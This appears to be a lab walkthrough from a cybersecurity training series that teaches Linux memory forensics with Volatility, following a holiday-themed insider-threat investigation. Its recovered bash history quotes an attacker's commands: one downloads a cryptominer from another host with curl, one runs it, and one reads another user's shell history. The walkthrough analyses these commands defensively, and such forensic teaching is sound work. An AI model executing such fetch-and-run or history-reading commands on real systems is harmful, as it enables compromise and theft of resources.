The elves are hard at work inside Santa's Security Operations Centre (SSOC), looking into more information about the insider threat. While analysing the network traffic, Log McBlue discovers some suspicious traffic coming from one of the Linux database servers. 

Quick to act, Forensic McBlue creates a memory dump of the Linux server along with a Linux profile in order to start the investigation.

**Learning Objectives**

- ﻿Understand what memory forensics is and how to use it in a digital forensics investigation
- Understand what volatile data and memory dumps are
- Learn about Volatility and how it can be used to analyse a memory dump
- Learn about Volatility profiles

What Is Memory Forensics

Memory forensics, also known as volatile memory analysis or random access memory (RAM) forensics, is a branch of digital forensics. It involves the examination and analysis of a computer's volatile memory (RAM) to uncover digital evidence and artefacts related to computer security incidents, cybercrimes, and other forensic investigations. This differs from hard disk forensics, where all files on the disk can be recovered and then studied. Memory forensics focuses on the programs that were running when the memory dump was created. This type of data is volatile because it will be deleted when the computer is turned off.

What Is Volatile Data

In computer forensics, volatile data refers to information that is temporarily stored in a computer's memory (RAM) and can be easily lost or altered when the computer is powered off or restarted. Volatile data is crucial for digital investigators because it provides a snapshot of the computer's state at the time of an incident. Any incident responder should be aware of what volatile data is. The reason is that when looking into a device that has been compromised, an initial reaction might be to turn off the device to contain the threat.

Elf McBlue holding a magnifying glassSome examples of volatile data are running processes, network connections, and RAM contents. Volatile data is not written to disk and is constantly changing in memory. The issue here is that any malware will be running in memory, meaning that any network connections and running processes that spawned from the malware will be lost. Powering down the device means valuable evidence will be destroyed.

What Is a Memory Dump

A memory dump is a snapshot of memory that has been captured to perform memory analysis. It will contain data relating to running processes captured when the memory dump was created.

Benefits of Memory Forensics

Memory forensics offers valuable benefits in digital investigations by capturing real-time data from a computer's volatile memory. It provides rapid insight into ongoing activities, detects stealthy threats, captures volatile data like passwords, and allows investigators to understand user actions and system states during incidents - all without altering the target system. In other words, memory forensics helps confirm malicious actors' activities by analysing a computer system's volatile memory to uncover evidence of unauthorised or malicious actions. It provides crucial insights into the attacker's tactics, techniques, and potential indicators of compromise (IOC).

Another thing to keep in mind is that capturing a hard disk image of a device can be time-consuming. Then, you have to consider the problem of transferring the image, which could be hundreds of gigabytes in size – and that's before you even consider how long the analysis will take the incident response (IR) team. This is where memory analysis can really help the IR team; capturing a memory dump from any device will be much faster and smaller. Suppose we prioritise RAM over a hard disk image. In that case, the IR team can already start analysing the memory dump for IOCs while beginning the process of capturing an image of the hard drive.

What Are Processes

A process is an independent, self-contained unit of execution within an operating system that consists of its own program code, data, memory space, and system resources. Imagine your computer as a busy chef in a kitchen. The chef can cook multiple dishes simultaneously, but to keep things organised, they use separate cooking stations for different tasks. Each cooking station has its own ingredients, pots, and pans. These cooking stations represent what we call "processes" in a computer. This is crucial in memory forensics because knowing the processes that were running during the capture of the memory dump will tell us what programs were also running at that time.

| Category	 | Description  | Example |
|---|---|---|
|  User Process	| These are processes a user has started. They typically involve applications and software users interact with directly. | Firefox: This is a web browser that we can use to surf the web. |
| Background Process | These are processes that operate without direct user interaction. They often perform tasks that are essential for the system's operation or for providing services to user processes. |Automated backups: Backup software often runs in the background, periodically backing up data to ensure its safety and recoverability.  |

Volatility

Volatility is a command-line tool that lets digital forensics and incident response teams analyse a memory dump in order to perform memory analysis. Volatility is written in Python, and it can analyse snapshots taken from Linux, Mac OS, and Windows. Volatility has a wide range of use cases, including the following:

- Listing any active and closed network connections
- Listing a device's running processes at the time of capture
- Listing possible command line history values
- Extracting possible malicious processes for further analysis
- And the list keeps on going

For this task, we'll examine the memory dump of a Linux device. For your convenience, Volatility is already installed on the VM. We can look at the different help options using ```vol.py -h```.

```
ubuntu@volatility:~$ vol.py -h
Volatility Foundation Volatility Framework 2.6.1 Usage: Volatility - A memory forensics analysis platform.

Options:
  -h, --help            List all available options and their default values.
  --d, --debug          Debug volatility
  --plugins=PLUGINS     Additional plugin directories to use (colon separated)
  --info                Print information about all registered objects

  --cropped for brevity--
```

Note: If you want to know how Volatility can be installed and all of its other benefits, check out our Volatility room. 

At the time of writing, there are two versions of Volatility: Volatility 2, which is built using Python 2, and Volatility 3, which uses Python 3. There are different use cases for each version, and depending on this, you might choose either one over the other. For example, Volatility 2 has been around for longer, so in some cases, it will have modules and plugins that have yet to be adapted to Volatility 3. For the purposes of this task, we're using Volatility 2.

Before we start analysing the memory dump, let's go into what profiles are and how Volatility uses them.

Volatility Profiles

Profiles are crucial for correctly interpreting the memory dump from a target system. A profile in Volatility defines the operating system's architecture, version, and various memory specific to the target system. Using the appropriate profile is crucial because different operating systems and versions have different memory layouts and data structures. Volatility comes with many profiles for the Windows operating system, and we can verify this using ```vol.py --info```.

```
ubuntu@volatility:~$ vol.py --info
Volatility Foundation Volatility Framework 2.6.1 Usage: 

Profiles:
---------
VistaSP0x64           - A Profile for Windows Vista SP0 x64
VistaSP0x86           - A Profile for Windows Vista SP0 x86
VistaSP1x64           - A Profile for Windows Vista SP1 x64
VistaSP1x86           - A Profile for Windows Vista SP1 x86
VistaSP2x64           - A Profile for Windows Vista SP2 x64
VistaSP2x86           - A Profile for Windows Vista SP2 x86

  --cropped for brevity--
```

Did you notice that there aren't any Linux profiles listed?

Profiles for the Linux operating system have to be manually created from the same device the memory dump is from. Here are some of the reasons why we typically have to create our own Linux profile:

- Linux is not a single, monolithic operating system but rather a diverse ecosystem with many distributions and configurations. Each distribution may have different kernel versions, configurations, and memory layouts. This variability makes it challenging to create a one-size-fits-all profile for Linux.
- Unlike Windows, which has more standardised memory structures and system APIs, Linux kernel internals can vary significantly across different distributions and versions. This lack of standardisation makes it difficult to create generic Linux profiles.
- Linux is open-source, meaning its source code is readily available for inspection and modification. This leads to greater flexibility and customisation but also results in more variability in memory structures.

Creating profiles is out of scope for this room, so for your convenience, a profile is already in the ```/home/ubuntu/Desktop/Evidence``` directory called Ubuntu_5.4.0-163-generic_profile.zip.

```
ubuntu@volatility:~$ cd ~/Desktop/Evidence/
ubuntu@volatility:~/Desktop/Evidence$ ls
linux.mem  Ubuntu_5.4.0-163-generic_profile.zip
```

To use the profile, we have to copy it where Volatility stores the various profiles for Linux. The command cp Ubuntu_5.4.0-163-generic_profile.zip ~/.local/lib/python2.7/site-packages/volatility/plugins/overlays/linux/ will take care of this for us. Then run vol.py --info | grep Ubuntu to confirm our profile is set.

```
ubuntu@volatility:~/Desktop/Evidence$ cp Ubuntu_5.4.0-163-generic_profile.zip ~/.local/lib/python2.7/site-packages/volatility/plugins/overlays/linux/

ubuntu@volatility:~/Desktop/Evidence$ ls ~/.local/lib/python2.7/site-packages/volatility/plugins/overlays/linux/
elf.py  elf.pyc  __init__.py  __init__.pyc  linux.py  linux.pyc  Ubuntu_5.4.0-163-generic_profile.zip

ubuntu@volatility:~/Desktop/Evidence$ vol.py --info | grep Ubuntu
LinuxUbuntu_5_4_0-163-generic_profilex64 - A Profile for Linux Ubuntu_5.4.0-163-generic_profile x64
```

Note: If you are curious about how to create a Linux profile, you'll find this article by Nicolas Béguier very helpful.

Now, we can begin our analysis.

Memory Analysis

The file linux.mem contains the memory dump of the Linux server we're going to analyse. This file is located in our home directory. For Volatility to begin the analysis, we have to specify the file with the -f flag and the profile with the --profile flag. We can use the -h flag to look at all the different plugins we can use to help with our analysis.

```
ubuntu@volatility:~/Desktop/Evidence$ vol.py -f linux.mem --profile="LinuxUbuntu_5_4_0-163-generic_profilex64" -h
Volatility Foundation Volatility Framework 2.6.1 Usage: Volatility - A memory forensics analysis platform.

Options:
  -h, --help            List all available options and their default values. 
  --conf-file=/home/thm/.volatilityrc 
User based configuration file
  --d, --debug          Debug volatility

--cropped for brevity--

Supported Plugin Commands:
linux_banner           Prints the Linux banner information
linux_bash             Recover bash history from bash process memory
linux_bash_env         Recover a process' dynamic environment variables
linux_enumerate_files  Lists files referenced by the filesystem cache
linux_find_file        Lists and recovers files from memory
linux_lsmod            Gather loaded kernel modules
linux_malfind          Looks for suspicious process mappings 
linux_procdump         Dumps a process's executable image to disk
linux_pslist           Gather active tasks by walking the task_struct->task list

--cropped for brevity--
```

We can see the different plugin options that we can use. Let's start with the history file.

Volatility Plugins

History File

The history file is a good place to start because it allows us to see whether there are any commands executed by our malicious actor while they were on the system. To examine the history file for any such commands, we can use the linux_bash plugin. The command will take a little less than a minute to finish executing.

```
ubuntu@volatility:~/Desktop/Evidence$ vol.py -f linux.mem --profile="LinuxUbuntu_5_4_0-163-generic_profilex64" linux_bash
Volatility Foundation Volatility Framework 2.6.1
Pid      Name                 Command Time                   Command
-------- -------------------- ------------------------------ -------
    8092 bash                 2023-10-02 18:13:46 UTC+0000   sudo su

--cropped for brevity--
   10205 bash                 2023-10-02 18:19:58 UTC+0000   mysql -u root -p'redacted'
   10205 bash                 2023-10-02 18:19:58 UTC+0000   id
   10205 bash                 2023-10-02 18:19:58 UTC+0000   curl http://10.0.2.64/toy_miner -o miner
   10205 bash                 2023-10-02 18:19:58 UTC+0000   ./miner
   10205 bash                 2023-10-02 18:19:58 UTC+0000   cat /home/elfie/.bash_history

--cropped for brevity--
```

When performing a cross-reference check with the elf analyst who was using the server, we identify the following suspicious commands:

- The mysql -u root -p'redacted' command was used by the elf analyst, but the cat /home/elfie/.bash_history command was not. This means the malicious actor most likely saw the MySQL command and had access to the database. There is a lot of sensitive information about the merger and the pipelines that the malicious actor could have gained access to.
- We also identify the curl http://10.0.2.64/toy_miner -o miner command, which the elf analyst confirms they didn't use themselves. This tells us that the malicious actor used cURL to download the toy_miner file and saved it using the -o parameter as a file named miner.
- We can also see that the malicious actor executed the miner file using the ./miner command.

Now that we understand what the malicious actor executed, we can look into the system's running processes.

Running Processes

In memory forensics, examining running processes is a fundamental and crucial part of analysing a system's memory dump. Analysing running processes in memory forensics can be highly effective in identifying anomalies because it provides a baseline for what should be expected in a healthy and normal system. For example, we know that the miner program was executed, so let's see what that process looks like. To examine the running processes on the system, we can use the linux_pslist plugin.

```
ubuntu@volatility:~/Desktop/Evidence$ vol.py -f linux.mem --profile="LinuxUbuntu_5_4_0-163-generic_profilex64" linux_pslist
Volatility Foundation Volatility Framework 2.6.1
Offset             Name                 Pid             PPid                
------------------ -------------------- --------------- ---------------  
0xffff9ce9bd5baf00 systemd              1               0                    
0xffff9ce9bd5bc680 kthreadd             2               0                     
0xffff9ce9bd5b9780 rcu_gp               3               2                    
0xffff9ce9bd5b8000 rcu_par_gp           4               2                    
0xffff9ce9bd5d4680 kworker/0:0H         6               2                    

--cropped for brevity--
0xffff9ce9b1f42f00 mysqld               8839            1                
0xffff9ce9ad115e00 systemd-udevd        10279           387                   
0xffff9ce9b1e4c680 miner                redacted        1                
0xffff9ce9bc23af00 mysqlserver          10291           1                  

--cropped for brevity--
```

As you can see, this plugin doesn't just list each process name. It also lists the process ID (PID) and the parent process ID (PPID). This helps determine what is often referred to as a "parent-child" relationship between processes. There are only two anomalies that we quickly identify: 

- The elf analyst confirmed they didn't execute the miner process. Based on the program name, our initial assumption is that we may be dealing with a cryptominer. A cryptominer, short for cryptocurrency miner, is a computer program or hardware device used to mine cryptocurrencies. Cryptocurrencies are digital or virtual currencies that use cryptographic techniques to secure and verify transactions on a decentralised network called a blockchain. Our insider threat could be trying to use our Linux server to mine cryptocurrencies and make some extra elf bucks.
- The mysqlserver appears to be benign, but this is misleading. The real process for MySQL is called mysqld, as listed above. The elf analyst confirmed that they didn't execute this. Given that the PID of this process is different from the PPID of the miner process, this process did not spawn from the miner directly.

We would like to know more about these processes. A good way to do this is by examining the binary of each process. We can do this via process extraction.

Process Extraction

A good way to understand what a process is doing is by extracting the binary of the process. This will help us analyse its behaviour using malware analysis. We also want to extract the binary of the process as a form of evidence preservation. To extract the binary of the process for examination, we can utilise the linux_procdump plugin. We just need to create a directory to indicate where we would like the extracted process to go with the mkdir extracted command. Then, we utilise the -D flag to tell Volatility where to place the extracted binary and indicate the process's PID with the -p flag. Creating a separate directory doesn't just help us stay organised; it's required by Volatility in order to avoid errors. Based on our file history and running processes findings, we are now going to extract the miner and mysqlserver binaries using the commands shown below:

```
ubuntu@volatility:~/Desktop/Evidence$ mkdir extracted
ubuntu@volatility:~/Desktop/Evidence$ vol.py -f linux.mem --profile="LinuxUbuntu_5_4_0-163-generic_profilex64" linux_procdump -D extracted -p PID
Volatility Foundation Volatility Framework 2.6.1
Offset             Name                 Pid             Address            Output File
------------------ -------------------- --------------- ------------------ -----------
0xffff9ce9b1e4c680 miner                PID             0x0000000000400000 extracted/miner.PID.0x400000

ubuntu@volatility:~/Desktop/Evidence$ vol.py -f linux.mem --profile="LinuxUbuntu_5_4_0-163-generic_profilex64" linux_procdump -D extracted -p 10291
Volatility Foundation Volatility Framework 2.6.1
Offset             Name                 Pid             Address            Output File
------------------ -------------------- --------------- ------------------ -----------
0xffff9ce9b1e4c680 mysqlserver          10291           0x0000000000400000 extracted/mysqlserver.10291.0x400000
```

We have successfully extracted the suspicious programs into the extracted folder. Having heard all of the commotion, McSkidy offers to help with the investigation by taking over the operation's threat intelligence tasks. McSkidy needs the MD5 hash of each extracted binary, which we can provide with the following command:

```
ubuntu@volatility:~/Desktop/Evidence$ ls extracted/
miner.PID.0x400000 mysqlserver.10291.0x400000

ubuntu@volatility:~/Desktop/Evidence$ md5sum extracted/miner.PID.0x400000              
REDACTED  extracted/miner.PID.0x400000

ubuntu@volatility:~/Desktop/Evidence$ md5sum extracted/mysqlserver.10291.0x400000              
REDACTED  extracted/mysqlserver.10291.0x400000
```

In the meantime, remembering what he learned from the Linux Forensics room, Forensic McBlue wants to check for persistence mechanisms that may have been planted by the malicious actor or cryptominer. Persistence mechanisms are ways a program can survive after a system reboot. This helps malware authors retain their access to a system even if it's rebooted. Good old McBlue remembers that a common persistence tactic is via cronjobs. While there isn't a plugin to review cronjobs, we can review them by enumerating for cron files.

File Extraction

As stated above, we want to look at any cron files that may have been placed by the malicious actor or cryptominer. This can help us identify if there are any persistence mechanisms at play. For example, is the mysqlserver process we found before part of a persistence mechanism? But how can we enumerate files on the server? We can utilise the linux_enumerate_files plugin to help us with this. The benefit of this plugin is to help us review any files of interest. The plugin's output will be too large, so we can utilise the grep utility to help us focus our search.

```
ubuntu@volatility:~/Desktop/Evidence$ vol.py -f linux.mem --profile="LinuxUbuntu_5_4_0-163-generic_profilex64" linux_enumerate_files | grep -i cron 
Volatility Foundation Volatility Framework 2.6.1 
0xffff9ce9bc312e80                       684 /home/crond.reboot
0xffff9ce9bb88f6f0                       682 /home/crond.pid
0xffff9ce9bb88cbb0                       679 /home/systemd/units/invocation:cron.service
0xffff9ce9baa31a98                    138255 /var/spool/cron
0xffff9ce9baa72bb8                    138259 /var/spool/cron/crontabs
0xffff9ce9b78280e8                    132687 /var/spool/cron/crontabs/elfie
0xffff9ce9baa54568                    138257 /var/spool/cron/atjobs
0xffff9ce9baa31650                     13246 /usr/sbin/cron
0xffff9ce9b7829ee0                       582 /usr/bin/crontab
               0x0 ------------------------- /usr/lib/systemd/system/cron.service.d
0xffff9ce9bc47d688                     10065 /usr/lib/systemd/system/cron.service

--cropped for brevity--
```

We quickly identify the crontab located in /var/spool/cron/crontabs/elfie. We speak to the elf analyst who confirms they didn't have any cronjobs set up on this server. We can now extract the file by selecting the inode value (the hex-like value located to the left of the file name) and using the -O option to name our file during output.

```
ubuntu@volatility:~/Desktop/Evidence$ vol.py -f linux.mem --profile="LinuxUbuntu_5_4_0-163-generic_profilex64" linux_find_file -i 0xffff9ce9b78280e8 -O elfie 
Volatility Foundation Volatility Framework 2.6.1 
ubuntu@volatility:~/Desktop/Evidence$ ls 
elfie  extracted  linux.mem  Ubuntu_5.4.0-163-generic_profile.zip
```

Go ahead and examine the contents of the elfie file using the cat elfie command in order to understand how the mysqlserver process was placed.

With all the overwhelming evidence, Elf McBlue decides to move the incident following the company incident response and incident management process.

Given the nature of the incident threat, along with the current news of the acquisition, the next question that arises from this incident is: "Are the pipelines safe?"

**Q/A**

![answers](https://github.com/schoto/Advent-of-Cyber-2023/assets/69323411/d4b33dd5-b0d7-4895-9db6-d91e35344efa)
